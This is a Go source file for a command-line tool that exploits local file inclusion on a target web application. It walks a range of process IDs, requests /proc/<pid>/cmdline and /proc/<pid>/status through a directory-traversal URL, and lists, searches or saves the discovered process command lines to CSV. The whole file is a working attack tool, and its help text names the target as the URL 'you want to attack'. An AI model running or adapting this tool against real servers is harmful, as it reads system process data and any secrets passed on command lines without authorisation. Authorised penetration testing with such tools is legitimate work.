package main

import (
	"bytes"
	"encoding/csv"
	"errors"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

var client = &http.Client{}

var (
	url                  string
	invalid_file         string
	unauthorized_file    string
	remove_suffix        string
	remove_prefix        string
	output_file          string
	starting_pid         int
	ending_pid           int
	search               string
	continue_on_success  bool
	proccess_command     = "/proc/*/cmdline"
	proccess_status      = "/proc/*/status"
	mode                 string
	dump                 = false
	found_counter        = 0
	requests_total       = 0
	requests_done        = 0
	requests_last_second = 0
)

func main() {

	flag.StringVar(&url, "t", "notarget", "The target URL you want to attack. In that format: http://target.url/location/for/lfi/?x=../../../*. Please add a star at the end of the string so the location for the LFI is set.")
	flag.StringVar(&invalid_file, "ns", "XXXX", "Add this string to filter for the content of a request. If the string appears, the process/cmdline is flagged as invalid.")
	flag.StringVar(&unauthorized_file, "us", "<pre></pre>", "What is the ouput if the process file is not accessable.")

	flag.StringVar(&remove_suffix, "remove-suffix", "", "This can be used to clean up the contents of the output (file) -beta.")
	flag.StringVar(&remove_prefix, "remove-prefix", "", "This can be used to clean up the contents of the output (file). - beta")

	flag.StringVar(&output_file, "output", "", "You can output the data in a csv file.")

	flag.IntVar(&starting_pid, "sp", 0, "Specify the starting pid for fuzzing")
	flag.IntVar(&ending_pid, "ep", 100000, "Specify the ending pid for fuzzing (This PID is included), change it for preformance.")

	flag.StringVar(&search, "search", "", "Search for a specific pattern inside the requests")
	flag.BoolVar(&continue_on_success, "continue-on-success", false, "If you specify this option the script will run to the end and output every match found.")
	flag.BoolVar(&dump, "dump", false, "Dump ")

	flag.Parse()
	mode = "non"
	if dump && search == "" {
		mode = "dump"
	}
	if !dump && search != "" {
		mode = "search"
	}
	fmt.Println(search)
	if mode == "non" {
		fmt.Println("Select ONE mode \033[94m-dump\033[0m or \033[94m-search <string>\033[0m!")
		os.Exit(3)
	}

	if url == "notarget" {
		fmt.Println("Please specify a targe with -t <target>!")
		os.Exit(3)
	}
	if invalid_file == "XXXX" {
		fmt.Println("Please specify a some text for a invalid file!")
		os.Exit(3)
	}

	banner()

	stop := make(chan bool)
	go process_progress_output(stop)
	requests_total = ending_pid - starting_pid + 1
	cmdlines, pids := fuzz_process_commands(starting_pid, ending_pid)
	stop <- true

	if search == "" {
		print_processes(cmdlines, pids)
	} else {
		if !continue_on_success {
			fmt.Println("Found the string which was searched!")
			print_processes([]string{cmdlines[len(cmdlines)-1]}, []int{pids[len(pids)-1]})
			more_info := dump_more(pids[len(pids)-1])
			fmt.Println(more_info)
		} else {
			cmdlines_filtered := []string{}
			pids_filtered := []int{}
			for i := 0; i < len(pids); i++ {
				if strings.Contains(cmdlines[i], search) {
					cmdlines_filtered = append(cmdlines_filtered, cmdlines[i])
					pids_filtered = append(pids_filtered, pids[i])
				}
			}
			cmdlines = cmdlines_filtered
			pids = pids_filtered
			print_processes(cmdlines, pids)
		}
	}
	if output_file != "" && continue_on_success && search != "" || output_file != "" && search == "" {
		pids_string := make([]string, len(pids))
		for i, v := range pids {
			pids_string[i] = fmt.Sprintf("%d", v)
		}

		data := [][]string{pids_string, cmdlines}
		create_csv(output_file, []string{"PIDs", "cmdline"}, data)
	}
}

func process_response(content string) (data string, err error) {
	if !strings.Contains(content, invalid_file) && !strings.Contains(content, unauthorized_file) {
		if remove_prefix != "" {
			content = strings.Split(content, remove_prefix)[0]
		}
		if remove_suffix != "" {
			content = strings.Split(content, remove_suffix)[1]
		}
		return content, nil
	}
	return "", errors.New("Not found")
}

func fuzz_process_commands(starting_id int, ending_id int) (cmdlines []string, pids []int) {
	found_cmdlines := []string{}
	found_pids := []int{}

	for i := starting_id; i <= ending_id; i++ {
		payload_file := strings.Replace(proccess_command, "*", strconv.Itoa(i), 1)

		content, err := do_request(payload_file)
		if err != nil {
			fmt.Println("Request could not be made!")
		}
		content_proc, err2 := process_response(content)
		if err2 == nil {
			found_cmdlines = append(found_cmdlines, content_proc)
			found_pids = append(found_pids, i)
			found_counter++

			if search != "" {
				if strings.Contains(content_proc, search) && !continue_on_success {
					break
				}
			}
		}
		requests_done++
	}
	return found_cmdlines, found_pids
}

func dump_more(pid int) (out string) {
	payload_file := strings.Replace(proccess_status, "*", strconv.Itoa(pid), 1)

	content, err := do_request(payload_file)
	if err != nil {
		fmt.Println("Request could not be made!")
	}
	content_processed, err := process_response(content)
	if err != nil {
		fmt.Println("Request could not be made!")
	}
	return content_processed
}

func do_request(payload string) (out string, err error) {
	url_ready := strings.Replace(url, "*", payload, 1)
	url_ready = strings.TrimSuffix(url_ready, "/")
	resp, err := client.Get(url_ready)
	if err != nil {
		fmt.Println(err)
		return "", err
	}
	defer resp.Body.Close()

	content_bytes, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err)
		return "", err
	}
	// in a cmdline file all spaces between the arguments are seperated with null bytes, this line will make it easier to read.
	content_bytes = bytes.ReplaceAll(content_bytes, []byte{byte(0x00)}, []byte{byte(0x20)})
	content := string(content_bytes)
	return content, nil
}

func process_progress_output(stop chan bool) {
	ticker := time.NewTicker(200 * time.Millisecond)
	for {
		select {
		case <-stop:
			return
		case <-ticker.C:
			fmt.Print("\033[F\033[K")
			found_counter_string := strconv.Itoa(found_counter)
			total := strconv.Itoa(requests_total)
			done := strconv.Itoa(requests_done)
			rps := strconv.Itoa((requests_done - requests_last_second))
			requests_last_second = requests_done
			fmt.Println("Requests progress: "+done+"/"+total+", Request per second: "+rps+" [R/s], Found processes: ", found_counter_string)
		}
	}
}

func print_processes(cmdlines []string, pids []int) {
	for i := 0; i < len(pids); i++ {

		fmt.Print("Process - ID: \033[94m")
		fmt.Print(strconv.Itoa(pids[i]))
		fmt.Print("\033[0m cmdline: \033[44m\033[97m")
		fmt.Print(cmdlines[i])
		fmt.Println("\033[0m")

	}
}

func create_csv(file_name string, header []string, data [][]string) (err error) {
	file, err := os.Create(file_name)
	if err != nil {
		return err
	}
	defer file.Close()

	writer := csv.NewWriter(file)
	defer writer.Flush()

	if err := writer.Write(header); err != nil {
		return err
	}
	for i := 0; i < len(data[0]); i++ {
		line := make([]string, len(data))

		for a := 0; a < len(data); a++ {
			line[a] = data[a][i]
		}

		if err := writer.Write(line); err != nil {
			return err
		}
	}
	return nil
}

func banner() {
	fmt.Println("\033[92m[* ]\033[0m Starting....")
}
